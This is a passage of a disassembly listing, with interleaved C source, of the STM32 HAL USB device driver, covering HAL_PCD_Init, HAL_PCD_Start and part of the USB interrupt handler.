    hpcd->State = HAL_PCD_STATE_ERROR;
 8001bd4:	687b      	ldr	r3, [r7, #4]
 8001bd6:	2202      	movs	r2, #2
 8001bd8:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    return HAL_ERROR;
 8001bdc:	2301      	movs	r3, #1
 8001bde:	e0c9      	b.n	8001d74 <HAL_PCD_Init+0x204>
  }

  /* Force Device Mode*/
  (void)USB_SetCurrentMode(hpcd->Instance, USB_DEVICE_MODE);
 8001be0:	687b      	ldr	r3, [r7, #4]
 8001be2:	681b      	ldr	r3, [r3, #0]
 8001be4:	2100      	movs	r1, #0
 8001be6:	4618      	mov	r0, r3
 8001be8:	f004 f8d0 	bl	8005d8c <USB_SetCurrentMode>

  /* Init endpoints structures */
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001bec:	2300      	movs	r3, #0
 8001bee:	73fb      	strb	r3, [r7, #15]
 8001bf0:	e040      	b.n	8001c74 <HAL_PCD_Init+0x104>
  {
    /* Init ep structure */
    hpcd->IN_ep[i].is_in = 1U;
 8001bf2:	7bfb      	ldrb	r3, [r7, #15]
 8001bf4:	6879      	ldr	r1, [r7, #4]
 8001bf6:	1c5a      	adds	r2, r3, #1
 8001bf8:	4613      	mov	r3, r2
 8001bfa:	009b      	lsls	r3, r3, #2
 8001bfc:	4413      	add	r3, r2
 8001bfe:	00db      	lsls	r3, r3, #3
 8001c00:	440b      	add	r3, r1
 8001c02:	3301      	adds	r3, #1
 8001c04:	2201      	movs	r2, #1
 8001c06:	701a      	strb	r2, [r3, #0]
    hpcd->IN_ep[i].num = i;
 8001c08:	7bfb      	ldrb	r3, [r7, #15]
 8001c0a:	6879      	ldr	r1, [r7, #4]
 8001c0c:	1c5a      	adds	r2, r3, #1
 8001c0e:	4613      	mov	r3, r2
 8001c10:	009b      	lsls	r3, r3, #2
 8001c12:	4413      	add	r3, r2
 8001c14:	00db      	lsls	r3, r3, #3
 8001c16:	440b      	add	r3, r1
 8001c18:	7bfa      	ldrb	r2, [r7, #15]
 8001c1a:	701a      	strb	r2, [r3, #0]
#if defined (USB_OTG_FS)
    hpcd->IN_ep[i].tx_fifo_num = i;
#endif /* defined (USB_OTG_FS) */
    /* Control until ep is activated */
    hpcd->IN_ep[i].type = EP_TYPE_CTRL;
 8001c1c:	7bfb      	ldrb	r3, [r7, #15]
 8001c1e:	6879      	ldr	r1, [r7, #4]
 8001c20:	1c5a      	adds	r2, r3, #1
 8001c22:	4613      	mov	r3, r2
 8001c24:	009b      	lsls	r3, r3, #2
 8001c26:	4413      	add	r3, r2
 8001c28:	00db      	lsls	r3, r3, #3
 8001c2a:	440b      	add	r3, r1
 8001c2c:	3303      	adds	r3, #3
 8001c2e:	2200      	movs	r2, #0
 8001c30:	701a      	strb	r2, [r3, #0]
    hpcd->IN_ep[i].maxpacket = 0U;
 8001c32:	7bfa      	ldrb	r2, [r7, #15]
 8001c34:	6879      	ldr	r1, [r7, #4]
 8001c36:	4613      	mov	r3, r2
 8001c38:	009b      	lsls	r3, r3, #2
 8001c3a:	4413      	add	r3, r2
 8001c3c:	00db      	lsls	r3, r3, #3
 8001c3e:	440b      	add	r3, r1
 8001c40:	3338      	adds	r3, #56	; 0x38
 8001c42:	2200      	movs	r2, #0
 8001c44:	601a      	str	r2, [r3, #0]
    hpcd->IN_ep[i].xfer_buff = 0U;
 8001c46:	7bfa      	ldrb	r2, [r7, #15]
 8001c48:	6879      	ldr	r1, [r7, #4]
 8001c4a:	4613      	mov	r3, r2
 8001c4c:	009b      	lsls	r3, r3, #2
 8001c4e:	4413      	add	r3, r2
 8001c50:	00db      	lsls	r3, r3, #3
 8001c52:	440b      	add	r3, r1
 8001c54:	333c      	adds	r3, #60	; 0x3c
 8001c56:	2200      	movs	r2, #0
 8001c58:	601a      	str	r2, [r3, #0]
    hpcd->IN_ep[i].xfer_len = 0U;
 8001c5a:	7bfa      	ldrb	r2, [r7, #15]
 8001c5c:	6879      	ldr	r1, [r7, #4]
 8001c5e:	4613      	mov	r3, r2
 8001c60:	009b      	lsls	r3, r3, #2
 8001c62:	4413      	add	r3, r2
 8001c64:	00db      	lsls	r3, r3, #3
 8001c66:	440b      	add	r3, r1
 8001c68:	3340      	adds	r3, #64	; 0x40
 8001c6a:	2200      	movs	r2, #0
 8001c6c:	601a      	str	r2, [r3, #0]
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001c6e:	7bfb      	ldrb	r3, [r7, #15]
 8001c70:	3301      	adds	r3, #1
 8001c72:	73fb      	strb	r3, [r7, #15]
 8001c74:	7bfa      	ldrb	r2, [r7, #15]
 8001c76:	687b      	ldr	r3, [r7, #4]
 8001c78:	685b      	ldr	r3, [r3, #4]
 8001c7a:	429a      	cmp	r2, r3
 8001c7c:	d3b9      	bcc.n	8001bf2 <HAL_PCD_Init+0x82>
  }

  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001c7e:	2300      	movs	r3, #0
 8001c80:	73fb      	strb	r3, [r7, #15]
 8001c82:	e044      	b.n	8001d0e <HAL_PCD_Init+0x19e>
  {
    hpcd->OUT_ep[i].is_in = 0U;
 8001c84:	7bfa      	ldrb	r2, [r7, #15]
 8001c86:	6879      	ldr	r1, [r7, #4]
 8001c88:	4613      	mov	r3, r2
 8001c8a:	009b      	lsls	r3, r3, #2
 8001c8c:	4413      	add	r3, r2
 8001c8e:	00db      	lsls	r3, r3, #3
 8001c90:	440b      	add	r3, r1
 8001c92:	f203 1369 	addw	r3, r3, #361	; 0x169
 8001c96:	2200      	movs	r2, #0
 8001c98:	701a      	strb	r2, [r3, #0]
    hpcd->OUT_ep[i].num = i;
 8001c9a:	7bfa      	ldrb	r2, [r7, #15]
 8001c9c:	6879      	ldr	r1, [r7, #4]
 8001c9e:	4613      	mov	r3, r2
 8001ca0:	009b      	lsls	r3, r3, #2
 8001ca2:	4413      	add	r3, r2
 8001ca4:	00db      	lsls	r3, r3, #3
 8001ca6:	440b      	add	r3, r1
 8001ca8:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8001cac:	7bfa      	ldrb	r2, [r7, #15]
 8001cae:	701a      	strb	r2, [r3, #0]
    /* Control until ep is activated */
    hpcd->OUT_ep[i].type = EP_TYPE_CTRL;
 8001cb0:	7bfa      	ldrb	r2, [r7, #15]
 8001cb2:	6879      	ldr	r1, [r7, #4]
 8001cb4:	4613      	mov	r3, r2
 8001cb6:	009b      	lsls	r3, r3, #2
 8001cb8:	4413      	add	r3, r2
 8001cba:	00db      	lsls	r3, r3, #3
 8001cbc:	440b      	add	r3, r1
 8001cbe:	f203 136b 	addw	r3, r3, #363	; 0x16b
 8001cc2:	2200      	movs	r2, #0
 8001cc4:	701a      	strb	r2, [r3, #0]
    hpcd->OUT_ep[i].maxpacket = 0U;
 8001cc6:	7bfa      	ldrb	r2, [r7, #15]
 8001cc8:	6879      	ldr	r1, [r7, #4]
 8001cca:	4613      	mov	r3, r2
 8001ccc:	009b      	lsls	r3, r3, #2
 8001cce:	4413      	add	r3, r2
 8001cd0:	00db      	lsls	r3, r3, #3
 8001cd2:	440b      	add	r3, r1
 8001cd4:	f503 73bc 	add.w	r3, r3, #376	; 0x178
 8001cd8:	2200      	movs	r2, #0
 8001cda:	601a      	str	r2, [r3, #0]
    hpcd->OUT_ep[i].xfer_buff = 0U;
 8001cdc:	7bfa      	ldrb	r2, [r7, #15]
 8001cde:	6879      	ldr	r1, [r7, #4]
 8001ce0:	4613      	mov	r3, r2
 8001ce2:	009b      	lsls	r3, r3, #2
 8001ce4:	4413      	add	r3, r2
 8001ce6:	00db      	lsls	r3, r3, #3
 8001ce8:	440b      	add	r3, r1
 8001cea:	f503 73be 	add.w	r3, r3, #380	; 0x17c
 8001cee:	2200      	movs	r2, #0
 8001cf0:	601a      	str	r2, [r3, #0]
    hpcd->OUT_ep[i].xfer_len = 0U;
 8001cf2:	7bfa      	ldrb	r2, [r7, #15]
 8001cf4:	6879      	ldr	r1, [r7, #4]
 8001cf6:	4613      	mov	r3, r2
 8001cf8:	009b      	lsls	r3, r3, #2
 8001cfa:	4413      	add	r3, r2
 8001cfc:	00db      	lsls	r3, r3, #3
 8001cfe:	440b      	add	r3, r1
 8001d00:	f503 73c0 	add.w	r3, r3, #384	; 0x180
 8001d04:	2200      	movs	r2, #0
 8001d06:	601a      	str	r2, [r3, #0]
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001d08:	7bfb      	ldrb	r3, [r7, #15]
 8001d0a:	3301      	adds	r3, #1
 8001d0c:	73fb      	strb	r3, [r7, #15]
 8001d0e:	7bfa      	ldrb	r2, [r7, #15]
 8001d10:	687b      	ldr	r3, [r7, #4]
 8001d12:	685b      	ldr	r3, [r3, #4]
 8001d14:	429a      	cmp	r2, r3
 8001d16:	d3b5      	bcc.n	8001c84 <HAL_PCD_Init+0x114>
  }

  /* Init Device */
  if (USB_DevInit(hpcd->Instance, hpcd->Init) != HAL_OK)
 8001d18:	687b      	ldr	r3, [r7, #4]
 8001d1a:	681b      	ldr	r3, [r3, #0]
 8001d1c:	603b      	str	r3, [r7, #0]
 8001d1e:	687e      	ldr	r6, [r7, #4]
 8001d20:	466d      	mov	r5, sp
 8001d22:	f106 0410 	add.w	r4, r6, #16
 8001d26:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8001d28:	c50f      	stmia	r5!, {r0, r1, r2, r3}
 8001d2a:	6823      	ldr	r3, [r4, #0]
 8001d2c:	602b      	str	r3, [r5, #0]
 8001d2e:	1d33      	adds	r3, r6, #4
 8001d30:	cb0e      	ldmia	r3, {r1, r2, r3}
 8001d32:	6838      	ldr	r0, [r7, #0]
 8001d34:	f004 f837 	bl	8005da6 <USB_DevInit>
 8001d38:	4603      	mov	r3, r0
 8001d3a:	2b00      	cmp	r3, #0
 8001d3c:	d005      	beq.n	8001d4a <HAL_PCD_Init+0x1da>
  {
    hpcd->State = HAL_PCD_STATE_ERROR;
 8001d3e:	687b      	ldr	r3, [r7, #4]
 8001d40:	2202      	movs	r2, #2
 8001d42:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    return HAL_ERROR;
 8001d46:	2301      	movs	r3, #1
 8001d48:	e014      	b.n	8001d74 <HAL_PCD_Init+0x204>
  }

  hpcd->USB_Address = 0U;
 8001d4a:	687b      	ldr	r3, [r7, #4]
 8001d4c:	2200      	movs	r2, #0
 8001d4e:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  hpcd->State = HAL_PCD_STATE_READY;
 8001d52:	687b      	ldr	r3, [r7, #4]
 8001d54:	2201      	movs	r2, #1
 8001d56:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9

  /* Activate LPM */
  if (hpcd->Init.lpm_enable == 1U)
 8001d5a:	687b      	ldr	r3, [r7, #4]
 8001d5c:	69db      	ldr	r3, [r3, #28]
 8001d5e:	2b01      	cmp	r3, #1
 8001d60:	d102      	bne.n	8001d68 <HAL_PCD_Init+0x1f8>
  {
    (void)HAL_PCDEx_ActivateLPM(hpcd);
 8001d62:	6878      	ldr	r0, [r7, #4]
 8001d64:	f001 fc9e 	bl	80036a4 <HAL_PCDEx_ActivateLPM>
  }

  (void)USB_DevDisconnect(hpcd->Instance);
 8001d68:	687b      	ldr	r3, [r7, #4]
 8001d6a:	681b      	ldr	r3, [r3, #0]
 8001d6c:	4618      	mov	r0, r3
 8001d6e:	f006 fadf 	bl	8008330 <USB_DevDisconnect>

  return HAL_OK;
 8001d72:	2300      	movs	r3, #0
}
 8001d74:	4618      	mov	r0, r3
 8001d76:	3714      	adds	r7, #20
 8001d78:	46bd      	mov	sp, r7
 8001d7a:	bdf0      	pop	{r4, r5, r6, r7, pc}

08001d7c <HAL_PCD_Start>:
  * @brief  Start the USB device
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_Start(PCD_HandleTypeDef *hpcd)
{
 8001d7c:	b580      	push	{r7, lr}
 8001d7e:	b082      	sub	sp, #8
 8001d80:	af00      	add	r7, sp, #0
 8001d82:	6078      	str	r0, [r7, #4]
#if defined (USB_OTG_FS)
  USB_OTG_GlobalTypeDef *USBx = hpcd->Instance;
#endif /* defined (USB_OTG_FS) */

  __HAL_LOCK(hpcd);
 8001d84:	687b      	ldr	r3, [r7, #4]
 8001d86:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8001d8a:	2b01      	cmp	r3, #1
 8001d8c:	d101      	bne.n	8001d92 <HAL_PCD_Start+0x16>
 8001d8e:	2302      	movs	r3, #2
 8001d90:	e012      	b.n	8001db8 <HAL_PCD_Start+0x3c>
 8001d92:	687b      	ldr	r3, [r7, #4]
 8001d94:	2201      	movs	r2, #1
 8001d96:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  {
    /* Enable USB Transceiver */
    USBx->GCCFG |= USB_OTG_GCCFG_PWRDWN;
  }
#endif /* defined (USB_OTG_FS) */
  __HAL_PCD_ENABLE(hpcd);
 8001d9a:	687b      	ldr	r3, [r7, #4]
 8001d9c:	681b      	ldr	r3, [r3, #0]
 8001d9e:	4618      	mov	r0, r3
 8001da0:	f003 ffc2 	bl	8005d28 <USB_EnableGlobalInt>
  (void)USB_DevConnect(hpcd->Instance);
 8001da4:	687b      	ldr	r3, [r7, #4]
 8001da6:	681b      	ldr	r3, [r3, #0]
 8001da8:	4618      	mov	r0, r3
 8001daa:	f006 faaa 	bl	8008302 <USB_DevConnect>
  __HAL_UNLOCK(hpcd);
 8001dae:	687b      	ldr	r3, [r7, #4]
 8001db0:	2200      	movs	r2, #0
 8001db2:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 8001db6:	2300      	movs	r3, #0
}
 8001db8:	4618      	mov	r0, r3
 8001dba:	3708      	adds	r7, #8
 8001dbc:	46bd      	mov	sp, r7
 8001dbe:	bd80      	pop	{r7, pc}

08001dc0 <HAL_PCD_IRQHandler>:
  * @brief  This function handles PCD interrupt request.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
void HAL_PCD_IRQHandler(PCD_HandleTypeDef *hpcd)
{
 8001dc0:	b580      	push	{r7, lr}
 8001dc2:	b084      	sub	sp, #16
 8001dc4:	af00      	add	r7, sp, #0
 8001dc6:	6078      	str	r0, [r7, #4]
  uint32_t wIstr = USB_ReadInterrupts(hpcd->Instance);
 8001dc8:	687b      	ldr	r3, [r7, #4]
 8001dca:	681b      	ldr	r3, [r3, #0]
 8001dcc:	4618      	mov	r0, r3
 8001dce:	f006 fac4 	bl	800835a <USB_ReadInterrupts>
 8001dd2:	60f8      	str	r0, [r7, #12]

  if ((wIstr & USB_ISTR_CTR) == USB_ISTR_CTR)
 8001dd4:	68fb      	ldr	r3, [r7, #12]
 8001dd6:	f403 4300 	and.w	r3, r3, #32768	; 0x8000
 8001dda:	2b00      	cmp	r3, #0
 8001ddc:	d003      	beq.n	8001de6 <HAL_PCD_IRQHandler+0x26>
  {
    /* servicing of the endpoint correct transfer interrupt */
    /* clear of the CTR flag into the sub */
    (void)PCD_EP_ISR_Handler(hpcd);
 8001dde:	6878      	ldr	r0, [r7, #4]
 8001de0:	f000 fb59 	bl	8002496 <PCD_EP_ISR_Handler>

    return;
 8001de4:	e110      	b.n	8002008 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_RESET) == USB_ISTR_RESET)
 8001de6:	68fb      	ldr	r3, [r7, #12]
 8001de8:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8001dec:	2b00      	cmp	r3, #0
 8001dee:	d013      	beq.n	8001e18 <HAL_PCD_IRQHandler+0x58>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_RESET);
 8001df0:	687b      	ldr	r3, [r7, #4]
 8001df2:	681b      	ldr	r3, [r3, #0]
 8001df4:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001df8:	b29a      	uxth	r2, r3
 8001dfa:	687b      	ldr	r3, [r7, #4]
 8001dfc:	681b      	ldr	r3, [r3, #0]
 8001dfe:	f422 6280 	bic.w	r2, r2, #1024	; 0x400
 8001e02:	b292      	uxth	r2, r2
 8001e04:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->ResetCallback(hpcd);
#else
    HAL_PCD_ResetCallback(hpcd);
 8001e08:	6878      	ldr	r0, [r7, #4]
 8001e0a:	f00a fd4c 	bl	800c8a6 <HAL_PCD_ResetCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    (void)HAL_PCD_SetAddress(hpcd, 0U);
 8001e0e:	2100      	movs	r1, #0
 8001e10:	6878      	ldr	r0, [r7, #4]
 8001e12:	f000 f8fc 	bl	800200e <HAL_PCD_SetAddress>

    return;
 8001e16:	e0f7      	b.n	8002008 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_PMAOVR) == USB_ISTR_PMAOVR)
 8001e18:	68fb      	ldr	r3, [r7, #12]
 8001e1a:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8001e1e:	2b00      	cmp	r3, #0
 8001e20:	d00c      	beq.n	8001e3c <HAL_PCD_IRQHandler+0x7c>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_PMAOVR);
 8001e22:	687b      	ldr	r3, [r7, #4]
 8001e24:	681b      	ldr	r3, [r3, #0]
 8001e26:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001e2a:	b29a      	uxth	r2, r3
 8001e2c:	687b      	ldr	r3, [r7, #4]
 8001e2e:	681b      	ldr	r3, [r3, #0]
 8001e30:	f422 4280 	bic.w	r2, r2, #16384	; 0x4000
 8001e34:	b292      	uxth	r2, r2
 8001e36:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8001e3a:	e0e5      	b.n	8002008 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_ERR) == USB_ISTR_ERR)
 8001e3c:	68fb      	ldr	r3, [r7, #12]
 8001e3e:	f403 5300 	and.w	r3, r3, #8192	; 0x2000
 8001e42:	2b00      	cmp	r3, #0
 8001e44:	d00c      	beq.n	8001e60 <HAL_PCD_IRQHandler+0xa0>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_ERR);
 8001e46:	687b      	ldr	r3, [r7, #4]
 8001e48:	681b      	ldr	r3, [r3, #0]
 8001e4a:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001e4e:	b29a      	uxth	r2, r3
 8001e50:	687b      	ldr	r3, [r7, #4]
 8001e52:	681b      	ldr	r3, [r3, #0]
 8001e54:	f422 5200 	bic.w	r2, r2, #8192	; 0x2000
 8001e58:	b292      	uxth	r2, r2
 8001e5a:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8001e5e:	e0d3      	b.n	8002008 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_WKUP) == USB_ISTR_WKUP)
 8001e60:	68fb      	ldr	r3, [r7, #12]
 8001e62:	f403 5380 	and.w	r3, r3, #4096	; 0x1000
 8001e66:	2b00      	cmp	r3, #0
 8001e68:	d034      	beq.n	8001ed4 <HAL_PCD_IRQHandler+0x114>
  {
    hpcd->Instance->CNTR &= (uint16_t) ~(USB_CNTR_LPMODE);
 8001e6a:	687b      	ldr	r3, [r7, #4]
 8001e6c:	681b      	ldr	r3, [r3, #0]
 8001e6e:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001e72:	b29a      	uxth	r2, r3
 8001e74:	687b      	ldr	r3, [r7, #4]
 8001e76:	681b      	ldr	r3, [r3, #0]
 8001e78:	f022 0204 	bic.w	r2, r2, #4
 8001e7c:	b292      	uxth	r2, r2
 8001e7e:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40
    hpcd->Instance->CNTR &= (uint16_t) ~(USB_CNTR_FSUSP);
 8001e82:	687b      	ldr	r3, [r7, #4]
 8001e84:	681b      	ldr	r3, [r3, #0]
 8001e86:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001e8a:	b29a      	uxth	r2, r3
 8001e8c:	687b      	ldr	r3, [r7, #4]
 8001e8e:	681b      	ldr	r3, [r3, #0]
 8001e90:	f022 0208 	bic.w	r2, r2, #8
 8001e94:	b292      	uxth	r2, r2
 8001e96:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

    if (hpcd->LPM_State == LPM_L1)
 8001e9a:	687b      	ldr	r3, [r7, #4]
 8001e9c:	f893 32e0 	ldrb.w	r3, [r3, #736]	; 0x2e0
 8001ea0:	2b01      	cmp	r3, #1
 8001ea2:	d107      	bne.n	8001eb4 <HAL_PCD_IRQHandler+0xf4>
    {
      hpcd->LPM_State = LPM_L0;
 8001ea4:	687b      	ldr	r3, [r7, #4]
 8001ea6:	2200      	movs	r2, #0
 8001ea8:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->LPMCallback(hpcd, PCD_LPM_L0_ACTIVE);
#else
      HAL_PCDEx_LPM_Callback(hpcd, PCD_LPM_L0_ACTIVE);
 8001eac:	2100      	movs	r1, #0
 8001eae:	6878      	ldr	r0, [r7, #4]
 8001eb0:	f00a ffd6 	bl	800ce60 <HAL_PCDEx_LPM_Callback>
    }

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->ResumeCallback(hpcd);
#else
    HAL_PCD_ResumeCallback(hpcd);
 8001eb4:	6878      	ldr	r0, [r7, #4]
 8001eb6:	f00a fd2f 	bl	800c918 <HAL_PCD_ResumeCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_WKUP);
 8001eba:	687b      	ldr	r3, [r7, #4]
 8001ebc:	681b      	ldr	r3, [r3, #0]
 8001ebe:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001ec2:	b29a      	uxth	r2, r3
 8001ec4:	687b      	ldr	r3, [r7, #4]
 8001ec6:	681b      	ldr	r3, [r3, #0]
 8001ec8:	f422 5280 	bic.w	r2, r2, #4096	; 0x1000
 8001ecc:	b292      	uxth	r2, r2
 8001ece:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8001ed2:	e099      	b.n	8002008 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_SUSP) == USB_ISTR_SUSP)
 8001ed4:	68fb      	ldr	r3, [r7, #12]
 8001ed6:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8001eda:	2b00      	cmp	r3, #0
 8001edc:	d027      	beq.n	8001f2e <HAL_PCD_IRQHandler+0x16e>
  {
    /* Force low-power mode in the macrocell */
    hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_FSUSP;
 8001ede:	687b      	ldr	r3, [r7, #4]
 8001ee0:	681b      	ldr	r3, [r3, #0]
 8001ee2:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001ee6:	b29a      	uxth	r2, r3
 8001ee8:	687b      	ldr	r3, [r7, #4]
 8001eea:	681b      	ldr	r3, [r3, #0]
 8001eec:	f042 0208 	orr.w	r2, r2, #8
 8001ef0:	b292      	uxth	r2, r2
 8001ef2:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

    /* clear of the ISTR bit must be done after setting of CNTR_FSUSP */
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_SUSP);
 8001ef6:	687b      	ldr	r3, [r7, #4]
 8001ef8:	681b      	ldr	r3, [r3, #0]
 8001efa:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001efe:	b29a      	uxth	r2, r3
 8001f00:	687b      	ldr	r3, [r7, #4]
 8001f02:	681b      	ldr	r3, [r3, #0]
 8001f04:	f422 6200 	bic.w	r2, r2, #2048	; 0x800
 8001f08:	b292      	uxth	r2, r2
 8001f0a:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_LPMODE;
 8001f0e:	687b      	ldr	r3, [r7, #4]
 8001f10:	681b      	ldr	r3, [r3, #0]
 8001f12:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001f16:	b29a      	uxth	r2, r3
 8001f18:	687b      	ldr	r3, [r7, #4]
 8001f1a:	681b      	ldr	r3, [r3, #0]
 8001f1c:	f042 0204 	orr.w	r2, r2, #4
 8001f20:	b292      	uxth	r2, r2
 8001f22:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->SuspendCallback(hpcd);
#else
    HAL_PCD_SuspendCallback(hpcd);
 8001f26:	6878      	ldr	r0, [r7, #4]
 8001f28:	f00a fcdc 	bl	800c8e4 <HAL_PCD_SuspendCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    return;
 8001f2c:	e06c      	b.n	8002008 <HAL_PCD_IRQHandler+0x248>
  }

  /* Handle LPM Interrupt */
  if ((wIstr & USB_ISTR_L1REQ) == USB_ISTR_L1REQ)
 8001f2e:	68fb      	ldr	r3, [r7, #12]
 8001f30:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8001f34:	2b00      	cmp	r3, #0
 8001f36:	d040      	beq.n	8001fba <HAL_PCD_IRQHandler+0x1fa>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_L1REQ);
 8001f38:	687b      	ldr	r3, [r7, #4]
 8001f3a:	681b      	ldr	r3, [r3, #0]
 8001f3c:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001f40:	b29a      	uxth	r2, r3
 8001f42:	687b      	ldr	r3, [r7, #4]
 8001f44:	681b      	ldr	r3, [r3, #0]
 8001f46:	f022 0280 	bic.w	r2, r2, #128	; 0x80
 8001f4a:	b292      	uxth	r2, r2
 8001f4c:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44
    if (hpcd->LPM_State == LPM_L0)
 8001f50:	687b      	ldr	r3, [r7, #4]
 8001f52:	f893 32e0 	ldrb.w	r3, [r3, #736]	; 0x2e0
 8001f56:	2b00      	cmp	r3, #0
 8001f58:	d12b      	bne.n	8001fb2 <HAL_PCD_IRQHandler+0x1f2>
    {
      /* Force suspend and low-power mode before going to L1 state*/
      hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_LPMODE;
 8001f5a:	687b      	ldr	r3, [r7, #4]
 8001f5c:	681b      	ldr	r3, [r3, #0]
 8001f5e:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001f62:	b29a      	uxth	r2, r3
 8001f64:	687b      	ldr	r3, [r7, #4]
 8001f66:	681b      	ldr	r3, [r3, #0]
 8001f68:	f042 0204 	orr.w	r2, r2, #4
 8001f6c:	b292      	uxth	r2, r2
 8001f6e:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40
      hpcd->Instance->CNTR |= (uint16_t)USB_CNTR_FSUSP;
 8001f72:	687b      	ldr	r3, [r7, #4]
 8001f74:	681b      	ldr	r3, [r3, #0]
 8001f76:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001f7a:	b29a      	uxth	r2, r3
 8001f7c:	687b      	ldr	r3, [r7, #4]
 8001f7e:	681b      	ldr	r3, [r3, #0]
 8001f80:	f042 0208 	orr.w	r2, r2, #8
 8001f84:	b292      	uxth	r2, r2
 8001f86:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

      hpcd->LPM_State = LPM_L1;
 8001f8a:	687b      	ldr	r3, [r7, #4]
 8001f8c:	2201      	movs	r2, #1
 8001f8e:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0
      hpcd->BESL = ((uint32_t)hpcd->Instance->LPMCSR & USB_LPMCSR_BESL) >> 2;
 8001f92:	687b      	ldr	r3, [r7, #4]
 8001f94:	681b      	ldr	r3, [r3, #0]
 8001f96:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 8001f9a:	b29b      	uxth	r3, r3
 8001f9c:	089b      	lsrs	r3, r3, #2
 8001f9e:	f003 023c 	and.w	r2, r3, #60	; 0x3c
 8001fa2:	687b      	ldr	r3, [r7, #4]
 8001fa4:	f8c3 22e4 	str.w	r2, [r3, #740]	; 0x2e4
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->LPMCallback(hpcd, PCD_LPM_L1_ACTIVE);
#else
      HAL_PCDEx_LPM_Callback(hpcd, PCD_LPM_L1_ACTIVE);
 8001fa8:	2101      	movs	r1, #1
 8001faa:	6878      	ldr	r0, [r7, #4]
 8001fac:	f00a ff58 	bl	800ce60 <HAL_PCDEx_LPM_Callback>
#else
      HAL_PCD_SuspendCallback(hpcd);
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
    }

    return;
 8001fb0:	e02a      	b.n	8002008 <HAL_PCD_IRQHandler+0x248>
      HAL_PCD_SuspendCallback(hpcd);
 8001fb2:	6878      	ldr	r0, [r7, #4]
 8001fb4:	f00a fc96 	bl	800c8e4 <HAL_PCD_SuspendCallback>
    return;
 8001fb8:	e026      	b.n	8002008 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_SOF) == USB_ISTR_SOF)
 8001fba:	68fb      	ldr	r3, [r7, #12]
 8001fbc:	f403 7300 	and.w	r3, r3, #512	; 0x200
 8001fc0:	2b00      	cmp	r3, #0
 8001fc2:	d00f      	beq.n	8001fe4 <HAL_PCD_IRQHandler+0x224>
  {
